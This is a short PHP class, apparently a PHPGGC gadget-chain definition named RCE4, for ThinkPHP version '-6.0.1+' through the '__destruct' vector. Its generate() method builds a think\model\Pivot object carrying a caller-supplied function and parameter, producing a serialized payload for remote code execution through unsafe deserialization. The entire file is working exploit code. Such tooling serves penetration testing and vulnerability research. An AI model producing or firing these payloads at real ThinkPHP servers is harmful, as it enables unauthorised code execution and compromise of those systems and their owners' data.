<?php

namespace GadgetChain\ThinkPHP;

class RCE4 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '-6.0.1+';
    public static $vector = '__destruct';
    public static $author = '???';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        return new \think\model\Pivot(0, $function, $parameter);
    }
}
